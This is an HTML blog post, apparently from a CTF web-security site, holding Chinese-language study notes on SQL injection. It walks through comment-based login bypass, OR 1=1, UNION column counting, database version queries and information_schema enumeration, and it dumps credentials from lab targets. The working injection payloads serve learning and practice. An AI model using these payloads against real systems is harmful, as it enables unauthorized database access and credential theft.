@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="整理了一下 SQL 注入的基础笔记，覆盖注释绕过、UNION 查询、盲注、报错注入、时间盲注、OAST 外带与防御思路。">
+    <meta name="author" content="hsjcha">
+    
+    <title>
+        
+            SQL注入基本知识（不定时更新） |
+        
+        HSJCHA LAB
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="https://cdn.hsjcha-lab.xyz/img/2026/04/ca96911eaa917b42816e9eb70d74e51f77daaf7cf51f65daeb881a14d3050db2/png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom-theme.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"hsjcha-lab.xyz","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#1fc7b6","title":"HSJCHA LAB","author":"hsjcha","avatar":"/images/hsjcha-avatar.svg","logo":"https://cdn.hsjcha-lab.xyz/img/2026/04/ca96911eaa917b42816e9eb70d74e51f77daaf7cf51f65daeb881a14d3050db2/png","favicon":"https://cdn.hsjcha-lab.xyz/img/2026/04/ca96911eaa917b42816e9eb70d74e51f77daaf7cf51f65daeb881a14d3050db2/png","mode":"dark"},"menu":{"home":"/ || fa-solid fa-house","archives":"/archives || fa-solid fa-box-archive","about":"/about || fa-solid fa-user-secret","links":"/links || fa-solid fa-link"},"first_screen":{"enable":true,"background_img":"https://cdn.hsjcha-lab.xyz/img/2026/04/945ad7881f3735d455d37947dd028b80344aacb0517e344e405c764401378772/jpg","background_img_dark":"https://cdn.hsjcha-lab.xyz/img/2026/04/945ad7881f3735d455d37947dd028b80344aacb0517e344e405c764401378772/jpg","description":"欢迎来到HSJCHA LAB！这是一个专注于CTF Web安全的博客","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/hsjcha","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"admin@hsjcha-lab.xyz"}},"aside":{"enable":true,"position":"left","social":true},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":"记录 CTF Web 相关的 Writeups、Notes 和 Practice。","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":false,"level_badge":false,"custom_badge":"CTF Web"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac","copy":true,"collapse":true},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2026,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom-theme.css"],"js":[null,"/js/custom-theme.js"]},"style":{"dark_mode":{"enable":true,"default":"dark"}},"root":"","source_data":{"links":[{"title":"Kap0k的大佬们（￣︶￣）↗　"},{"name":"KC1zs4","link":"https://kc1zs4.github.io/","avatar":"https://kc1zs4.github.io/pic/favicon/favicon.svg","description":null},{"name":"L1nk","link":"https://li1nk3.github.io/","avatar":"https://li1nk3.github.io/image/icon.jpg","description":null},{"name":"xNftrOne","link":"https://www.cnblogs.com/xNftrOne","avatar":"https://ooo.0x0.ooo/2025/05/27/OdV7Q6.jpg","description":null},{"name":"mik0M1koμiii","link":"https://mikouiblog.vercel.app/","avatar":"https://mikouiblog.vercel.app/_astro/ui.BM1qpdMw_kO5nV.webp","description":null},{"name":"ItsFlicker","link":"https://blog.mcitd.cn/","avatar":"https://blog.mcitd.cn/_astro/avatar.zT8EqTHN_S4v1p.webp","description":null},{"name":"mxym","link":"https://mxym.github.io/","avatar":"https://mxym.github.io/_astro/logo.Bdnat9uk_1BsRtd.webp","description":null},{"name":"ghsc223311","link":"https://ghsc223311.github.io","avatar":"https://github.com/ghsc223311.png","description":null}]},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="https://cdn.hsjcha-lab.xyz/img/2026/04/ca96911eaa917b42816e9eb70d74e51f77daaf7cf51f65daeb881a14d3050db2/png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               HSJCHA LAB
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-house"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-secret"></i>
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-link"></i>
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-house"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-secret"></i>
+                                </span>
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-link"></i>
+                                </span>
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        SQL注入基本知识（不定时更新）
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/hsjcha-avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">hsjcha</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-04-30 11:30:00</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Thu Apr 30 2026 13:21:24 GMT+0800">2026-04-30 13:21:24</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.2k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>32 分钟</span>
+            </span>
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>整理了一下 SQL 注入的基础笔记，覆盖注释绕过、UNION 查询、盲注、报错注入、时间盲注、OAST 外带与防御思路。</p>
+<span id="more"></span>
+
+<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><p>当你点击一个网站的分类页面，浏览器会请求类似与以下URL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>insecure<span class="operator">-</span>website.com<span class="operator">/</span>products?category<span class="operator">=</span>Gifts</span><br></pre></td></tr></table></figure>
+
+<p>而后台数据库会发出SQL查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的released &#x3D; 1, 代表着只能看已发布的产品</p>
+<p>假设网站没有针对SQL注入攻击的防御措施，就可以通过 ‘– 来显示所有产品</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span><span class="comment">--&#x27; AND released = 1</span></span><br></pre></td></tr></table></figure>
+
+<p>在SQL语句中 – 生注释指示符，这意味着 ‘Gifts’–’ 后面的内容会被注释掉，来达到显示所有产品的目的</p>
+<p>也可以通过 ‘OR+1&#x3D;1– 来达到相同的目的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>insecure<span class="operator">-</span>website.com<span class="operator">/</span>products?category<span class="operator">=</span>Gifts<span class="string">&#x27;+OR+1=1--</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27; AND released = 1</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的查询会返回 分类为Gifts 或 1&#x3D;1 的所有项目，但是因1&#x3D;1 始终为真，所以查询所有项目</p>
+<h3 id="–注释的应用"><a href="#–注释的应用" class="headerlink" title="–注释的应用"></a>–注释的应用</h3><p>注释 : 用注释来截断查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Oracle           <span class="comment">--comment</span></span><br><span class="line">Microsoft        <span class="comment">--comment</span></span><br><span class="line">                 <span class="comment">/*comment*/</span></span><br><span class="line">PostgreSQL       <span class="comment">--comment</span></span><br><span class="line">                 <span class="comment">/*comment*/</span></span><br><span class="line">MySQL            #comment</span><br><span class="line">                 <span class="comment">-- comment</span></span><br><span class="line">                 <span class="comment">/*comment*/</span></span><br></pre></td></tr></table></figure>
+
+<p>当一个网站需要用户密码来登录时，SQL会通过查询来验证有没有这个用户，成功则登录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;hsjcha&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;123456&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是可以通过 – 注释掉WHERE字句中的密码查询部分，来进行管理员登录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;--&amp;password=123456   //密码顺便填，来保证不为空</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE username = &#x27;</span>admin<span class="string">&#x27;--&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;123456&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="从数据库表中检索数据"><a href="#从数据库表中检索数据" class="headerlink" title="从数据库表中检索数据"></a>从数据库表中检索数据</h2><p>当程序存在SQL注入漏洞，可以通过 UNION 来检索其他表的数据，并且把结果附加到原始查询</p>
+<p>要 UNION 正常工作有两个关键要求：</p>
+<ul>
+<li>各个查询返回相同数量的列</li>
+<li>各个查询每一列的数据类型需兼容</li>
+</ul>
+<p>确定几列<br>方法1：’ ORDER BY 1–    &#x2F;&#x2F;这个数字可以从大到小，直到不发生错误<br>方法2：’ UNION SELECT NULL,NULL–  &#x2F;&#x2F;空值的数量根据情况添加，直到发生错误</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span></span><br><span class="line"><span class="operator">/</span><span class="keyword">filter</span>?category<span class="operator">=</span>Gifts<span class="string">&#x27;+ORDER+BY+3--</span></span><br><span class="line"><span class="string">测试在 &#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">4</span> 会报错，那就是有<span class="number">3</span>列</span><br><span class="line"></span><br><span class="line">方法<span class="number">2</span></span><br><span class="line"><span class="operator">/</span><span class="keyword">filter</span>?category<span class="operator">=</span>Gifts<span class="string">&#x27;UNION+SELECT+NULL,NULL,NULL--</span></span><br></pre></td></tr></table></figure>
+
+<p>寻找可用的数据类型的列</p>
+<p>一般需要的数据都是字符串形式，所以需要找到数据类型是字符串或者字符串数据兼容的，可以通过 UNION SELECT 有效负载来为每列放置字符串值，如果没有报错且返回包括注入字符串在内的额外内容，那就找对了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="keyword">filter</span>?category<span class="operator">=</span>Gifts<span class="string">&#x27;+UNION+SELECT+&#x27;</span>hsjcha<span class="string">&#x27;,NULL,NULL--</span></span><br><span class="line"><span class="string">/filter?category=Gifts&#x27;</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="string">&#x27;hsjcha&#x27;</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">/</span><span class="keyword">filter</span>?category<span class="operator">=</span>Gifts<span class="string">&#x27;+UNION+SELECT+NULL,NULL,&#x27;</span>hsjcha<span class="string">&#x27;-- //正常返回</span></span><br></pre></td></tr></table></figure>
+
+<p>使用SQL 注入 UNION 攻击来检索有趣的数据</p>
+<p>当确定列数，且找到哪些列可以存储字符串数据，就可以检索数据了</p>
+<p>题目提示数据库有一个’user’表，有两列：’username’ 和 ‘password’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="keyword">filter</span>?category<span class="operator">=</span>Gifts<span class="string">&#x27;+ORDER+BY+2--</span></span><br><span class="line"><span class="string">/filter?category=Gifts&#x27;</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="string">&#x27;hsj&#x27;</span>,<span class="string">&#x27;cha&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="operator">/</span><span class="keyword">filter</span>?category<span class="operator">=</span>Gifts<span class="string">&#x27;+UNION+SELECT+username,+password+FROM+users--</span></span><br></pre></td></tr></table></figure>
+
+<p>返回 账号密码<br>administrator<br>fvpt9j5afl6kkwjp64g6</p>
+<h3 id="检查数据库"><a href="#检查数据库" class="headerlink" title="检查数据库"></a>检查数据库</h3><p>为了利用 SQL 注入漏洞，通常要找数据库相关信息</p>
+<ul>
+<li>数据库软件类型和版本</li>
+<li>数据库的表和列</li>
+</ul>
+<p>查询数据库版本</p>
+<blockquote>
+<p>Tip: Oracle 有一个内置表 <code>dual</code></p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle        <span class="keyword">SELECT</span> BANNER <span class="keyword">FROM</span> v$version</span><br><span class="line">              <span class="keyword">SELECT</span> version <span class="keyword">FROM</span> v$instance</span><br><span class="line">Microsoft     <span class="keyword">SELECT</span> @<span class="variable">@version</span></span><br><span class="line">MySQL         <span class="keyword">SELECT</span> @<span class="variable">@version</span></span><br><span class="line">PostgreSQL    <span class="keyword">SELECT</span> version()</span><br></pre></td></tr></table></figure>
+
+<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先确定列数和可用列，在查找数据库信息</span><br><span class="line"><span class="operator">/</span><span class="keyword">filter</span>?category<span class="operator">=</span>Gifts<span class="string">&#x27;+UNION+SELECT+&#x27;</span>hsj<span class="string">&#x27;,&#x27;</span>cha<span class="string">&#x27;+FROM+dual--</span></span><br><span class="line"><span class="string">/filter?category=Gifts&#x27;</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>BANNER,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>v$version<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="MySQL-Microsoft"><a href="#MySQL-Microsoft" class="headerlink" title="MySQL &#x2F; Microsoft"></a>MySQL &#x2F; Microsoft</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先确定列数和可用列，在查找数据库信息</span><br><span class="line"><span class="operator">/</span><span class="keyword">filter</span>?category<span class="operator">=</span>Gifts<span class="string">&#x27;+UNION+SELECT+&#x27;</span>hsj<span class="string">&#x27;,&#x27;</span>cha<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">/filter?category=Gifts&#x27;</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>@<span class="variable">@version</span>,<span class="operator">+</span><span class="keyword">NULL</span>#</span><br></pre></td></tr></table></figure>
+
+<h3 id="列出数据库内容"><a href="#列出数据库内容" class="headerlink" title="列出数据库内容"></a>列出数据库内容</h3><p>多数的数据库都有一组信息模式的视图（Oracle 除外）</p>
+<p>查表查列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Oracle      <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> all_tables</span><br><span class="line">            <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line">Microsoft   <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables</span><br><span class="line">            <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line">PostgreSQL  <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables</span><br><span class="line">            <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line">MySQL       <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables</span><br><span class="line">            <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="MySQL-Microsoft-1"><a href="#MySQL-Microsoft-1" class="headerlink" title="MySQL &#x2F; Microsoft"></a>MySQL &#x2F; Microsoft</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查列数</span><br><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span>hsj<span class="string">&#x27;,&#x27;</span>cha<span class="string">&#x27;--   //2列</span></span><br><span class="line"><span class="string">查表</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> table_name, <span class="keyword">NULL</span> <span class="keyword">FROM</span> information_schema.tables<span class="comment">--   //users_xlansl</span></span><br><span class="line">查列</span><br><span class="line"><span class="string">&#x27; UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&#x27;</span>users_xlansl<span class="string">&#x27;--  //username_slrexo，password_ytmiud</span></span><br><span class="line"><span class="string">获取账号密码</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username_slrexo, password_ytmiud <span class="keyword">FROM</span> users_xlansl<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">administrator</span><br><span class="line"><span class="number">45</span>bshha9khaz8pqy3nd8</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Tip: 在burp suite 可以先把SQL注入词写好再通过 ctrl + u 来url加密</p>
+</blockquote>
+<h4 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查列数</span><br><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span>hsj<span class="string">&#x27;, &#x27;</span>cha<span class="string">&#x27; FROM dual--</span></span><br><span class="line"><span class="string">查表</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> table_name, <span class="keyword">NULL</span> <span class="keyword">FROM</span> all_tables<span class="comment">--   //USERS_UGYJZG</span></span><br><span class="line">查列</span><br><span class="line"><span class="string">&#x27; UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name=&#x27;</span>USERS_UGYJZG<span class="string">&#x27;--  //USERNAME_OWQTBT, PASSWORD_EXCGYW</span></span><br><span class="line"><span class="string">获取账号密码</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> USERNAME_OWQTBT, PASSWORD_EXCGYW <span class="keyword">FROM</span> USERS_UGYJZG<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">administrator</span><br><span class="line">cn8sz9drqsc8tcrw0a8f</span><br></pre></td></tr></table></figure>
+
+<h3 id="在单一列中查询多个值"><a href="#在单一列中查询多个值" class="headerlink" title="在单一列中查询多个值"></a>在单一列中查询多个值</h3><p>当数据库只有一个列可以显示字符串的值，就可以用 ‘||’ 把两个结果串起来一起输出</p>
+<p>字符串连接:把多条字符串连接起来，形成一个</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Oracle      <span class="string">&#x27;cyber&#x27;</span><span class="operator">||</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line">Microsoft   <span class="string">&#x27;cyber&#x27;</span><span class="operator">+</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line">PostgreSQL  <span class="string">&#x27;cyber&#x27;</span><span class="operator">||</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line">MySQL      CONCAT(<span class="string">&#x27;cyber&#x27;</span>,<span class="string">&#x27;security&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
